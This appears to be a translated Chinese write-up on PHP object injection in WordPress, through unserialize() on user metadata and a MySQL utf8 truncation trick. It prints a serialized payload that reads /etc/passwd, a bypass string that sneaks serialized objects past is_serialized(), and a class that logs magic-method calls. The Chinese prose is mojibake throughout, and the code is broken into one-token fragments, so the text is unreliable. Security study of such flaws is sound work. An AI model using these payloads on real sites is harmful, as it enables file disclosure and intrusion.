<p>è®©æˆ‘ä»¬ä¸¾ä¸ªä¾‹å­å§ï¼Œæƒ³è±¡ä»¥ä¸‹çš„ä»£ç ä¸­çš„classæ˜¯ç”¨æˆ·è‡ªå·±ç”Ÿæˆçš„å†…å®¹è¢«unserializeæ—¶è½½å…¥çš„ï¼š</p>
<p>ï¼ˆps:è€å¤–è´´å‡ºçš„ä»£ç è¯­æ³•æœ‰é—®é¢˜ï¼Œæ”¹äº†ä¸€ä¸‹æµ‹è¯•æˆåŠŸâ€¦â€¦ï¼‰
&lt;?php</p>
<p>class</p>
<p>Foo {</p>
<p>private</p>
<p>$bar</p>
<p>;</p>
<p>public</p>
<p>$file</p>
<p>;</p>
<p>public</p>
<p>function</p>
<p>__construct(</p>
<p>$fileName</p>
<p>) {</p>
<p>$this</p>
<p>-&gt;bar =</p>
<p>&#39;foobar&#39;</p>
<p>;</p>
<p>$this</p>
<p>-&gt;file =</p>
<p>$fileName</p>
<p>;</p>
<p>}</p>
<p>// ä¸€äº›å…¶ä»–çš„ä»£ç â€¦â€¦</p>
<p>public</p>
<p>function</p>
<p>__toString() {</p>
<p>return</p>
<p>file_get_contents</p>
<p>(</p>
<p>$this</p>
<p>-&gt;file);</p>
<p>}</p>
<p>}
?&gt;</p>
<p>å¦‚æœå—å®³çš„ç¼ºé™·ä»£ç åŒæ—¶è¿˜å­˜åœ¨ä»¥ä¸‹çš„ä»£ç ï¼š</p>
<p>1echo</p>
<p>unserialize(</p>
<p>$_GET</p>
<p>[</p>
<p>&#39;in&#39;</p>
<p>]);</p>
<p>è¿™æ”»å‡»è€…å°±å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶ï¼Œæ”»å‡»è€…å¯ä»¥å¦‚ä¸‹å»æ„é€ å®ƒçš„å¯¹è±¡ã€‚</p>
<p>1</p>
<p>2
3</p>
<p>4
5</p>
<p>6
7</p>
<p>8
&lt;?php</p>
<p>class</p>
<p>Foo {</p>
<p>public</p>
<p>$file</p>
<p>;</p>
<p>}
$foo</p>
<p>=</p>
<p>new</p>
<p>Foo();</p>
<p>$foo</p>
<p>-&gt;file =</p>
<p>&#39;/etc/passwd&#39;</p>
<p>;
echo</p>
<p>serialize(</p>
<p>$foo</p>
<p>);</p>
<p>?&gt;</p>
<p>ä¸Šé¢è¿™æ®µä»£ç çš„ç»“æœæ˜¯ï¼šO:3:&quot;Foo&quot;:1:{s:4:&quot;file&quot;;s:11:&quot;/etc/passwd&quot;;} ï¼Œæ”»å‡»è€…ç°åœ¨è¦åšçš„äº‹æƒ…å°±äº‹é€šè¿‡æäº¤getè¯·æ±‚åˆ°å­˜åœ¨æ¼æ´çš„é¡µé¢è§¦å‘ä»–çš„æ”»å‡»ä»£ç ã€‚è¿™ä¸ªé¡µé¢ä¼šåå‡º/etc/passwdçš„å†…å®¹æ¥ã€‚èƒ½è¯»åˆ°è¿™äº›æ–‡ä»¶çš„å†…å®¹æ€ä¹ˆçœ‹éƒ½ä¸æ˜¯ä¸€ä¸ªå¥½äº‹æƒ…ï¼Œä½ å°±æƒ³è±¡ä¸€ä¸‹ï¼Œä¸‡ä¸€ç¼ºé™·ä»£ç ä¸­çš„å‡½æ•°ä¸æ˜¯file_get_contentsè€Œæ˜¯evalå‘¢ï¼Ÿ</p>
<p>æˆ‘ç›¸ä¿¡ä¸Šé¢è¿™éƒ¨åˆ†å·²ç»èƒ½è®©äººæ˜ç™½å…è®¸ç”¨æˆ·è¾“å…¥è¿›å…¥unserializeè¿™ä¸ªå‡½æ•°å±å®³æœ‰å¤šå¤§äº†ã€‚å°±è¿PHPæ‰‹å†Œé‡Œä¹Ÿè¯´äº†ä¸è¦æŠŠç”¨æˆ·ç”Ÿæˆçš„å†…å®¹äº¤ç»™unserializeå‡½æ•°ã€‚</p>
<h3 id="-">è­¦å‘Šï¼š</h3>
<p>ä¸è¦æŠŠä¸å¯ä¿¡çš„ç”¨æˆ·è¾“å…¥äº¤ç»™unserializeï¼Œä½¿ç”¨è¯¥å‡½æ•°è§£åºåˆ—åŒ–å†…å®¹èƒ½å¯¼è‡´è®¿é—®ä¸”è‡ªåŠ¨è½½å…¥å¯¹è±¡ï¼Œæ¶æ„ç”¨æˆ·å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œä»å®‰å…¨çš„è§’åº¦ï¼Œå¦‚æœä½ æƒ³è®©ç”¨æˆ·å¯ä»¥æ ‡å‡†çš„ä¼ é€’æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨json ï¼ˆjson_encode json_decodeï¼‰ã€‚</p>
<p>å¥½ï¼Œè®©æˆ‘ä»¬ç»§ç»­è¯´è¿™äº›é—®é¢˜æ€ä¹ˆå½±å“åˆ°Wordpressã€‚</p>
<h2 id="0x01-wordpress-">0x01 wordpressçš„å®‰å…¨é—®é¢˜</h2>
<p>Stefan Esser&#39;sçš„é»‘å¸½æ¼”è®²ä¸­ï¼Œä»–æåˆ°Wordpressæ˜¯ä¸€æ¬¾ä½¿ç”¨äº†serializeå’Œunserializeå‡½æ•°çš„çŸ¥ååº”ç”¨ã€‚åœ¨ä»–çš„å¹»ç¯ç‰‡ä¸­ï¼Œunserializeç”¨æ¥æ¥æ”¶æ¥è‡ªWordpressç«™ç‚¹ä¸Šçš„æ•°æ®ã€‚æ‰€ä»¥æ”»å‡»è€…å¯ä»¥åœ¨å—å®³ç«™ç‚¹ä¸Šå‘èµ·ä¸€æ¬¡ä¸­é—´äººæ”»å‡»ã€‚ä»–å¯ä»¥ä¿®æ”¹æ¥è‡ªWordpressç«™ç‚¹çš„è¿”å›æ•°æ®ï¼ŒæŠŠä»–çš„ä»£ç åŠ è¿›å»ã€‚æœ‰è¶£çš„æ˜¯å°±åœ¨æˆ‘ç¼–å†™è¿™ç¯‡æ–‡ç« çš„æ—¶å€™ï¼ŒWordpressæœ€æ–°çš„ç‰ˆæœ¬ä¹ŸåŒ…å«è¿™ä¸ªé—®é¢˜ï¼ˆè·ç¦»é‚£æ¼”è®²ä¼¼ä¹è¿‡å»ä¸‰å¹´äº†ï¼‰ï¼Œæƒ³è±¡ä¸€ä¸‹ï¼Œå¦‚æœæœ‰é»‘å®¢å¯ä»¥åŠ«æŒWordPress.orgçš„DNSä¼šå‘ç”Ÿä»€ä¹ˆäº‹æƒ…å§ã€‚</p>
<p>ç„¶è€Œï¼Œè¿™ä¹Ÿä¸æ˜¯Wordpressä½¿ç”¨è¿™ä¸ªunserializeçš„å”¯ä¸€åœ°æ–¹ï¼Œå®ƒè¿˜ç”¨äºç”¨äºåœ¨æ•°æ®åº“ä¸­æ•°æ®ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œç”¨æˆ·çš„metadataå°±è¢«åºåˆ—åŒ–åå­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œmetadataçš„å–å›æ–¹å¼åœ¨wp-includes/meta.phpçš„272è¡Œçš„get_metadata()ï¼Œæˆ‘åœ¨è¿™é‡Œå¼•ç”¨ä¸€ä¸‹è¯¥å‡½æ•°çš„éƒ¨åˆ†ä»£ç ï¼ˆ292-297è¡Œï¼‰</p>
<p>if</p>
<p>( isset(</p>
<p>$meta_cache</p>
<p>[</p>
<p>$meta_key</p>
<p>]) ) {</p>
<p>if</p>
<p>(</p>
<p>$single</p>
<p>)</p>
<p>return</p>
<p>maybe_unserialize(</p>
<p>$meta_cache</p>
<p>[</p>
<p>$meta_key</p>
<p>][0] );</p>
<p>else</p>
<p>return</p>
<p>array_map</p>
<p>(</p>
<p>&#39;maybe_unserialize&#39;</p>
<p>,</p>
<p>$meta_cache</p>
<p>[</p>
<p>$meta_key</p>
<p>]);</p>
<p>}</p>
<p>åŸºæœ¬ä¸Šï¼Œè¿™ä¸ªå‡½æ•°æ‰€å¹²çš„äº‹æƒ…å°±æ˜¯å–å›æ•°æ®åº“é‡Œçš„metadataï¼ˆå®ƒæ¥è‡ªæ¯ç¯‡æ–‡ç« æˆ–ç”¨æˆ·è¾“å…¥ï¼‰ï¼Œæ•°æ®åœ¨æ•°æ®åº“ä¸­çš„wp_postmetaå’Œwp_usermetaè¡¨ä¸­ï¼Œæœ‰äº›æ•°æ®æ˜¯è¢«åºåˆ—åŒ–çš„è€Œæœ‰äº›æ²¡æœ‰è¢«åºåˆ—åŒ–ï¼Œæ‰€ä»¥maybe_unserialize()å‡½æ•°æ›¿ä»£äº†unserialize()åœ¨è¿™é‡Œæ“ä½œï¼Œè¿™ä¸ªå‡½æ•°åœ¨wp-includes/functions.phpçš„230åˆ°234è¡Œä¹‹é—´è¢«å®šä¹‰ã€‚</p>
<p>1</p>
<p>2
3</p>
<p>4
5function</p>
<p>maybe_unserialize(</p>
<p>$original</p>
<p>) {</p>
<p>if</p>
<p>( is_serialized(</p>
<p>$original</p>
<p>) )</p>
<p>//åºåˆ—åŒ–çš„æ•°æ®æ‰ä¼šèµ°åˆ°è¿™é‡Œé¢</p>
<p>return</p>
<p>@unserialize(</p>
<p>$original</p>
<p>);</p>
<p>return</p>
<p>$original</p>
<p>;
}</p>
<p>æ‰€ä»¥ï¼Œè¿™ä¸ªå‡½æ•°å¹²çš„äº‹æƒ…æ˜¯æ£€æŸ¥ç»™äºˆå®ƒçš„å€¼æ˜¯ä¸æ˜¯ä¸€ä¸ªåºåˆ—åŒ–çš„æ•°æ®ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œå°±è§£åºåˆ—åŒ–ã€‚è¿™é‡Œç”¨æ¥åˆ¤æ–­æ˜¯å¦æ˜¯åºåˆ—åŒ–æ‰€ä½¿ç”¨çš„å‡½æ•°æ˜¯is_serialized()ï¼Œå®ƒçš„å®šä¹‰åœ¨åŒæ–‡ä»¶çš„247åˆ°276è¡Œä¹‹é—´ã€‚</p>
<p>function</p>
<p>is_serialized(</p>
<p>$data</p>
<p>) {</p>
<p>// å¦‚æœè¿å­—ç¬¦ä¸²éƒ½ä¸æ˜¯ï¼Œé‚£å°±ä¸æ˜¯åºåˆ—åŒ–çš„æ•°æ®äº†</p>
<p>if</p>
<p>( !</p>
<p>is_string</p>
<p>(</p>
<p>$data</p>
<p>) )</p>
<p>return</p>
<p>false;</p>
<p>$data</p>
<p>= trim(</p>
<p>$data</p>
<p>);</p>
<p>if</p>
<p>(</p>
<p>&#39;N;&#39;</p>
<p>==</p>
<p>$data</p>
<p>)</p>
<p>return</p>
<p>true;</p>
<p>$length</p>
<p>=</p>
<p>strlen</p>
<p>(</p>
<p>$data</p>
<p>);</p>
<p>if</p>
<p>(</p>
<p>$length</p>
<p>&lt; 4 )</p>
<p>return</p>
<p>false;</p>
<p>if</p>
<p>(</p>
<p>&#39;:&#39;</p>
<p>!==</p>
<p>$data</p>
<p>[1] )</p>
<p>return</p>
<p>false;</p>
<p>$lastc</p>
<p>=</p>
<p>$data</p>
<p>[</p>
<p>$length</p>
<p>-1];</p>
<p>if</p>
<p>(</p>
<p>&#39;;&#39;</p>
<p>!==</p>
<p>$lastc</p>
<p>&amp;&amp;</p>
<p>&#39;}&#39;</p>
<p>!==</p>
<p>$lastc</p>
<p>)</p>
<p>return</p>
<p>false;</p>
<p>$token</p>
<p>=</p>
<p>$data</p>
<p>[0];</p>
<p>switch</p>
<p>(</p>
<p>$token</p>
<p>) {</p>
<p>case</p>
<p>&#39;s&#39;</p>
<p>:</p>
<p>if</p>
<p>(</p>
<p>&#39;&quot;&#39;</p>
<p>!==</p>
<p>$data</p>
<p>[</p>
<p>$length</p>
<p>-2] )</p>
<p>return</p>
<p>false;</p>
<p>case</p>
<p>&#39;a&#39;</p>
<p>:</p>
<p>case</p>
<p>&#39;O&#39;</p>
<p>:</p>
<p>return</p>
<p>(bool) preg_match(</p>
<p>&quot;/^{$token}:[0-9]+:/s&quot;</p>
<p>,</p>
<p>$data</p>
<p>);</p>
<p>case</p>
<p>&#39;b&#39;</p>
<p>:</p>
<p>case</p>
<p>&#39;i&#39;</p>
<p>:</p>
<p>case</p>
<p>&#39;d&#39;</p>
<p>:</p>
<p>return</p>
<p>(bool) preg_match(</p>
<p>&quot;/^{$token}:[0-9.E-]+;\$/&quot;</p>
<p>,</p>
<p>$data</p>
<p>);</p>
<p>}</p>
<p>return</p>
<p>false;</p>
<p>}</p>
<p>WordPressæ£€æŸ¥ä¸€ä¸ªå€¼æ˜¯å¦æ˜¯åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸ºä»€ä¹ˆé‚£ä¹ˆé‡è¦çš„åŸå› é©¬ä¸Šè¦å˜å¾—æ¸…æ™°äº†ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹ä¸€ä¸ªæ”»å‡»è€…å¦‚ä½•æŠŠä»–çš„å†…å®¹æœ€ç»ˆåŠ å…¥åˆ°metadataè¡¨ä¸­çš„ã€‚æ¯ä¸ªç”¨æˆ·çš„å§“åï¼Œé›…è™IMéƒ½å­˜å‚¨åœ¨wp_usermetaè¡¨é‡Œã€‚æ‰€ä»¥æˆ‘ä»¬æŠŠè‡ªå·±çš„æ¶æ„ä»£ç åŠ åœ¨é‚£æˆ‘ä»¬å°±å¯ä»¥ææ‚æ‰WordPressï¼Œå¯¹ä¸å¯¹ï¼Ÿä½ å¯ä»¥è¯•è¯•åœ¨ä½ è¯¥å†™åå­—çš„åœ°æ–¹å†™ä¸ªi:1è¯•è¯•ï¼Œå¦‚æœè¿™ä¸ªæ²¡æœ‰è¢«è§£åºåˆ—åŒ–é‚£è¿™é‡Œåªä¼šè¿”å›ä¸€ä¸ªæˆ‘ä»¬è¾“å…¥çš„i:1ã€‚</p>
<p>éº»ç—¹çš„ï¼Œçœ‹æ¥è¦å‘å‡ ä¸ªå¤§æ‹›æ‰å¯ä»¥ææ‚WordPresså•Šã€‚è®©æˆ‘ä»¬æŒ–å¾—å†æ·±ä¸€ç‚¹ï¼Œçœ‹çœ‹ä¸ºä»€ä¹ˆè¿™ä¸ªä¸œè¥¿å°±æ²¡æœ‰ç»™è§£åºåˆ—åŒ–ã€‚åœ¨ wp-includes/meta.php ä¸­ï¼Œè¿™ä¸ªupdate_metadata() å‡½æ•°å®šä¹‰åœ¨101-164è¡Œï¼Œè¿™é‡Œæœ‰è¿™ä¸ªå‡½æ•°çš„éƒ¨åˆ†ä»£ç ã€‚</p>
<p>// â€¦</p>
<p>$meta_value</p>
<p>= wp_unslash(</p>
<p>$meta_value</p>
<p>);</p>
<p>$meta_value</p>
<p>= sanitize_meta(</p>
<p>$meta_key</p>
<p>,</p>
<p>$meta_value</p>
<p>,</p>
<p>$meta_type</p>
<p>);</p>
<p>// â€¦</p>
<p>$meta_value</p>
<p>= maybe_serialize(</p>
<p>$meta_value</p>
<p>);</p>
<p>$data</p>
<p>= compact(</p>
<p>&#39;meta_value&#39;</p>
<p>);</p>
<p>// â€¦</p>
<p>$wpdb</p>
<p>-&gt;update(</p>
<p>$table</p>
<p>,</p>
<p>$data</p>
<p>,</p>
<p>$where</p>
<p>);</p>
<p>// â€¦</p>
<p>è¿™é‡Œmaybe_serializeå‡½æ•°å¯èƒ½èƒ½è§£é‡Šä¸ºä»€ä¹ˆæˆ‘ä»¬åˆšæ‰çš„æ“ä½œæ²¡æˆåŠŸï¼Œæˆ‘ä»¬å†è·Ÿè¿›å»çœ‹çœ‹è¿™ä¸ªå‡½æ•°ï¼Œå®ƒå®šä¹‰åœ¨wp-includes/functions.phpçš„314-324è¡Œã€‚</p>
<p>function</p>
<p>maybe_serialize(</p>
<p>$data</p>
<p>) {</p>
<p>if</p>
<p>(</p>
<p>is_array</p>
<p>(</p>
<p>$data</p>
<p>) ||</p>
<p>is_object</p>
<p>(</p>
<p>$data</p>
<p>) )</p>
<p>return</p>
<p>serialize(</p>
<p>$data</p>
<p>);</p>
<p>// äºŒæ¬¡åºåˆ—åŒ–æ˜¯ä¸ºäº†å‘ä¸‹æ”¯æŒ</p>
<p>// è¯¦è§ <a href="http://core.trac.wordpress.org/ticket/12930" target="_blank">http://core.trac.wordpress.org/ticket/12930</a></p>
<p>if</p>
<p>( is_serialized(</p>
<p>$data</p>
<p>) )</p>
<p>return</p>
<p>serialize(</p>
<p>$data</p>
<p>);</p>
<p>return</p>
<p>$data</p>
<p>;</p>
<p>}</p>
<p>æ‰€ä»¥å½“æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªåºåˆ—åŒ–çš„å€¼çš„è¯ï¼Œå®ƒå°±ä¼šå†åºåˆ—åŒ–ä¸€ä¸‹ï¼Œè¿™å°±æ˜¯ç°åœ¨å‘ç”Ÿçš„æƒ…å†µï¼Œä½ çœ‹ï¼Œæ•°æ®åº“é‡Œçš„ä¸œè¥¿ä¸æ˜¯i:1;è€Œæ˜¯s:4:&quot;i:1;&quot;;ï¼Œå½“è§£åºåˆ—åŒ–çš„æ—¶å€™å®ƒå°±æ˜¾ç¤ºä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé‚£ç°åœ¨è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<p>ä½ æ‡‚çš„ï¼Œè¿™å¸–å­çš„å†…å®¹ä¹Ÿå­˜åœ¨æ•°æ®åº“é‡Œï¼Œä¸Šé¢è¿™å°±è¯´æ˜äº†ä¸ºä»€ä¹ˆæˆ‘ä»¬å¤±è´¥äº†ã€‚å¦‚æœæˆ‘ä»¬ç°åœ¨æƒ³å¾€æ•°æ®åº“æ’ä¸€ä¸ªåºåˆ—åŒ–åçš„ä¸œè¥¿ï¼Œæˆ‘ä»¬å°±éœ€è¦åœ¨æˆ‘ä»¬æ’å…¥æ•°æ®çš„æ—¶å€™è®©is_serialized()è¿™ä¸ªå‡½æ•°è¿”å›ä¸€ä¸ªfalseï¼Œè€Œå½“æˆ‘ä»¬å†ä»æ•°æ®é‡Œå–å®ƒçš„æ—¶å€™ï¼Œå®ƒå°±åº”è¯¥è¿”å›ä¸ªtrueäº†ã€‚</p>
<p>ä½ æ‡‚çš„ï¼ŒMysqlæ•°æ®åº“ï¼Œè¡¨å’Œå­—æ®µéƒ½æœ‰ä»–ä»¬è‡ªå·±çš„charsetå’Œcollation(å­—ç¬¦é›†å’Œå®šåºï¼‰ã€‚WordPresså‘¢ï¼Œé»˜è®¤çš„å­—ç¬¦é›†æ˜¯UTF-8ã€‚ä»è¿™ä¸ªåå­—å°±çœ‹çš„å‡ºæ¥ï¼Œè¿™ä¸ªå­—ç¬¦é›†å®ƒä¸æ”¯æŒå…¨éƒ¨çš„Unicodeå­—ç¬¦ï¼Œä½ è¦æ˜¯å¯¹è¿™ä¸ªæ„Ÿå…´è¶£ï¼Œä½ å¯ä»¥çœ‹çœ‹Mathias Bynensçš„è¿™ç¯‡æ–‡ç« ï¼š<a href="http://mathiasbynens.be/notes/mysql-utf8mb4ï¼Œè¿™æ–‡ç« æ•™äº†æˆ‘UTF-8çš„è¡¨å‚¨å­˜ä¸äº†Unicodeç¼–ç åŒºé—´æ˜¯U+010000åˆ°U+10FFFFçš„å­—ç¬¦ã€‚æ‰€ä»¥å½“æˆ‘ä»¬åœ¨è¿™ä¸ªæƒ…å†µä¸‹å°è¯•ä¿å­˜è¿™äº›å­—ç¬¦å‘¢ï¼Ÿæ˜¾è€Œæ˜“è§ï¼ŒåŒ…æ‹¬è¿™ä¸ªå­—ç¬¦å’Œè¿™ä¸ªå­—ç¬¦ä¹‹åçš„å†…å®¹éƒ½ä¼šè¢«å¿½ç•¥æ‰ã€‚æ‰€ä»¥åœ¨æˆ‘ä»¬å°è¯•æ’å…¥" target="_blank">http://mathiasbynens.be/notes/mysql-utf8mb4ï¼Œè¿™æ–‡ç« æ•™äº†æˆ‘UTF-8çš„è¡¨å‚¨å­˜ä¸äº†Unicodeç¼–ç åŒºé—´æ˜¯U+010000åˆ°U+10FFFFçš„å­—ç¬¦ã€‚æ‰€ä»¥å½“æˆ‘ä»¬åœ¨è¿™ä¸ªæƒ…å†µä¸‹å°è¯•ä¿å­˜è¿™äº›å­—ç¬¦å‘¢ï¼Ÿæ˜¾è€Œæ˜“è§ï¼ŒåŒ…æ‹¬è¿™ä¸ªå­—ç¬¦å’Œè¿™ä¸ªå­—ç¬¦ä¹‹åçš„å†…å®¹éƒ½ä¼šè¢«å¿½ç•¥æ‰ã€‚æ‰€ä»¥åœ¨æˆ‘ä»¬å°è¯•æ’å…¥</a></p>
<p>fooğŒ†bar
çš„æ—¶å€™ï¼ŒMysqlä¼šå¿½ç•¥</p>
<p>ğŒ†bar
è€Œä¿å­˜ä¸ºfooã€‚</p>
<p>è¿™ä¸ªè¿·é¢˜çš„æœ€åä¸€éƒ¨åˆ†å°±æ˜¯æˆ‘ä»¬éœ€è¦æ’å…¥ä¸€ä¸ªç”¨ä»¥ä¸€ä¼šå„¿è§£åºåˆ—åŒ–çš„å†…å®¹ï¼Œä¸ºäº†æµ‹è¯•è¿™ä¸ªï¼Œä½ å¯ä»¥æ’å…¥</p>
<p>1:iğŒ†
ä¸ºä½ çš„åå­—ã€‚æ­£å¦‚æ‰€è§åˆ°çš„ï¼Œç»“æœæ˜¯1ï¼Œæ„å‘³ç€ä½ çš„è¾“å…¥è¢«è§£åºåˆ—åŒ–äº†ï¼Œå¦‚æœä½ è¿˜ä¸ç›¸ä¿¡æˆ‘ï¼Œä½ è¯•ç€è¾“å…¥ä¸€ä¸ªç©ºæ•°ç»„çš„åºåˆ—åŒ–å¹¶ä¸”ä»¥è¯¥å­—ç¬¦ç»“å°¾ï¼š</p>
<p>a:0:{}ğŒ†
ã€‚è¿™ä¸ªç»“æœæ˜¯Arrayã€‚</p>
<p>è®©æˆ‘ä»¬ç»§ç»­</p>
<p>maybe_serialized(&#39;i:1;ğŒ†&#39;)
æ’å…¥äº†æ•°æ®åº“ã€‚WordPressä¸è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªå·²åºåˆ—åŒ–çš„æ•°æ®ï¼Œå› ä¸ºå®ƒä¸æ˜¯;æˆ–è€…}ç»“å°¾çš„ã€‚å®ƒä¼šè¿”å›</p>
<p>i:1;ğŒ†
ï¼Œå½“æ’å…¥æ•°æ®åº“çš„æ—¶å€™ï¼Œå®ƒçš„å€¼æ˜¯i:1ï¼Œå½“å®ƒä»æ•°æ®åº“å–å›çš„æ—¶å€™ï¼Œå®ƒæœ‰äº†;æœ€ä¸ºæœ€åä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥å®ƒå¯ä»¥è§£åºåˆ—åŒ–æˆåŠŸã€‚ç¢‰å ¡äº†ã€‚æ¼æ´ã€‚</p>
<h2 id="0x02-wordpress-">0x02 WordPress åˆ©ç”¨</h2>
<p>ç°åœ¨æˆ‘ä»¬å±•ç¤ºäº†WordPresså­˜åœ¨PHPå¯¹è±¡æ³¨å…¥æ¼æ´ã€‚è®©æˆ‘ä»¬å°è¯•åˆ©ç”¨å®ƒã€‚æ‰€ä»¥ä¸ºäº†åˆ©ç”¨è¯¥æ¼æ´ï¼ˆé€šè¿‡æ³¨å…¥å¯¹è±¡çš„æ–¹æ³•ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç¬¦åˆä»¥ä¸‹æ¡ä»¶çš„classï¼š</p>
<p>1ï¼Œå†…æœ‰â€œæœ‰ç”¨â€çš„æ–¹æ³•å¯è¢«è°ƒç”¨ã€‚
2ï¼Œå­˜åœ¨è¯¥å¯¹è±¡çš„ç±»å·²ç»è¢«åŒ…å«äº†ã€‚</p>
<p>å½“ä¸€ä¸ªå¯¹è±¡è¢«è§£åºåˆ—åŒ–çš„æ—¶å€™ï¼Œ__wakeupå‡½æ•°ä¼šè¢«è°ƒç”¨ï¼Œè¿™è¢«ç§°ä½œPHPçš„é­”æœ¯æ–¹æ³•ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬ç¡®å®šä¼šè¢«è°ƒç”¨çš„æ–¹æ³•ï¼Œå®é™…ä¸Šè¿™äº›å‡½æ•°ä¼šæ›´å¤šå†™äº›ï¼Œæˆ‘å†™äº†ä¸€ä¸ªä»¥ä¸‹çš„classæ¥è·å–è¢«è°ƒç”¨çš„classåˆ°/tmp/fumc.logã€‚
&lt;?php</p>
<p>class</p>
<p>Foo {</p>
<p>public</p>
<p>static</p>
<p>function</p>
<p>logFuncCall(</p>
<p>$funcName</p>
<p>) {</p>
<p>$fh</p>
<p>=</p>
<p>fopen</p>
<p>(</p>
<p>&#39;/tmp/func.log&#39;</p>
<p>,</p>
<p>&#39;a&#39;</p>
<p>);</p>
<p>fwrite(</p>
<p>$fh</p>
<p>,</p>
<p>$funcName</p>
<p>.</p>
<p>&quot;\n&quot;</p>
<p>);</p>
<p>fclose(</p>
<p>$fh</p>
<p>);</p>
<p>}</p>
<p>public</p>
<p>function</p>
<p>__construct() { Foo::logFuncCall(</p>
<p>&#39;__construct(&#39;</p>
<p>.json_encode(func_get_args()).</p>
<p>&#39;)&#39;</p>
<p>);}</p>
<p>public</p>
<p>function</p>
<p>__destruct() { Foo::logFuncCall(</p>
<p>&#39;__destruct()&#39;</p>
<p>);}</p>
<p>public</p>
<p>function</p>
<p>__get(</p>
<p>$name</p>
<p>) { Foo::logFuncCall(</p>
<p>&quot;__get($name)&quot;</p>
<p>);</p>
<p>return</p>
<p>&quot;Foo&quot;</p>
<p>;}</p>
<p>public</p>
<p>function</p>
<p>__set(</p>
<p>$name</p>
<p>,</p>
<p>$value</p>
<p>) { Foo::logFuncCall(</p>
<p>&quot;__set($name, value)&quot;</p>
<p>);}</p>
<p>public</p>
<p>function</p>
<p>__isset(</p>
<p>$name</p>
<p>) { Foo::logFuncCall(</p>
<p>&quot;__isset($name)&quot;</p>
<p>);</p>
<p>return</p>
<p>true;}</p>
<p>public</p>
<p>function</p>
<p>__unset(</p>
<p>$name</p>
<p>) { Foo::logFuncCall(</p>
<p>&quot;__unset($name)&quot;</p>
<p>);}</p>
<p>public</p>
<p>function</p>
<p>__sleep() { Foo::logFuncCall(</p>
<p>&quot;__sleep()&quot;</p>
<p>);</p>
<p>return</p>
<p>array</p>
<p>();}</p>
<p>public</p>
<p>function</p>
<p>__wakeup() { Foo::logFuncCall(</p>
<p>&quot;__wakeup()&quot;</p>
<p>);}</p>
<p>public</p>
<p>function</p>
<p>__toString() { Foo::logFuncCall(</p>
<p>&quot;__toString()&quot;</p>
<p>);</p>
<p>return</p>
<p>&quot;Foo&quot;</p>
<p>;}</p>
<p>public</p>
<p>function</p>
<p>__invoke(</p>
<p>$a</p>
<p>) { Foo::logFuncCall(</p>
<p>&quot;__invoke(&quot;</p>
<p>. json_encode(func_get_args()).</p>
<p>&quot;)&quot;</p>
<p>);}</p>
<p>public</p>
<p>function</p>
<p>__call(</p>
<p>$a</p>
<p>,</p>
<p>$b</p>
<p>) { Foo::logFuncCall(</p>
<p>&quot;__call(&quot;</p>
<p>. json_encode(func_get_args()).</p>
<p>&quot;)&quot;</p>
<p>);}</p>
<p>public</p>
<p>static</p>
<p>function</p>
<p>__callStatic(</p>
<p>$a</p>
<p>,</p>
<p>$b</p>
<p>) { Foo::logFuncCall(</p>
<p>&quot;__callStatic(&quot;</p>
<p>. json_encode(func_get_args()).</p>
<p>&quot;)&quot;</p>
<p>);}</p>
<p>public</p>
<p>static</p>
<p>function</p>
<p>__set_state(</p>
<p>$a</p>
<p>) { Foo::logFuncCall(</p>
<p>&quot;__set_state(&quot;</p>
<p>. json_encode(func_get_args()).</p>
<p>&quot;)&quot;</p>
<p>);</p>
<p>return</p>
<p>null;}</p>
<p>public</p>
<p>function</p>
<p>__clone() { Foo::logFuncCall(</p>
<p>&quot;__clone()&quot;</p>
<p>);}</p>
<p>}
?&gt;</p>
<p>ä¸ºäº†åˆ—å‡ºè¿™äº›è¢«è°ƒç”¨çš„å‡½æ•°ï¼Œé¦–å…ˆè¦ç¡®è®¤è¿™ä¸ªå‡½æ•°åœ¨è§£åºåˆ—åŒ–å‘ç”Ÿçš„æ—¶å€™æ˜¯è¢«å¼•å…¥è¢«åŒ…å«è¿‡çš„ï¼ˆphpä¸­çš„include requireç­‰ï¼‰ã€‚ä½ å¯ä»¥æŠŠrequire_once(&#39;foo.php&#39;)åŠ åˆ°functions.phpçš„é¡¶ç«¯ã€‚æ¥ä¸‹æ¥ï¼ŒæŠŠåå­—æ”¹ä¸ºO:3:&quot;Foo&quot;:0:{}ğŒ†æ¥å°è¯•åˆ©ç”¨è¿™ä¸ªPHPå¯¹è±¡æ³¨å…¥æ¼æ´ï¼Œå½“åˆ·æ–°é¡µé¢åï¼Œä½ å›çœ‹åˆ°ä½ çš„åå­—å˜æˆäº†Fooï¼Œè¿™ä¹Ÿå°±æ˜¯æ„å‘³ç€è¿™æ˜¯ä¸Šé¢é‚£classä¸­__toString()å‡½æ•°çš„è¿”å›ï¼Œç„¶åè®©æˆ‘ä»¬çœ‹çœ‹éƒ½æœ‰å“ªäº›å‡½æ•°è¢«è°ƒç”¨äº†ã€‚</p>
<p>$ sort -u /tmp/func.log <strong>destruct() </strong>toString() __wakeup()</p>
<p>ç»™å‡ºäº†æˆ‘ä»¬ä¸‰ä¸ªå‡½æ•°ï¼š<strong>wakeup(), </strong>destruct() å’Œ __toString()</p>
<p>å¾ˆä¸å¹¸çš„æ˜¯æˆ‘ä¸èƒ½å†WordPressä¸­æ‰¾åˆ°ä¸€ä¸ªè½½å…¥äº†å¹¶ä¸”è§£åºåˆ—åŒ–æ—¶èƒ½è¢«åˆ©ç”¨é€ æˆå½±å“çš„ç±»ã€‚æ‰€ä»¥ä¸æ˜¯ä¸€ä¸ªWordPressçš„å®‰å…¨é—®é¢˜ï¼Œè€Œæ˜¯ä¸€ä¸ªå¯èƒ½åˆ©ç”¨çš„åœ°æ–¹ã€‚</p>
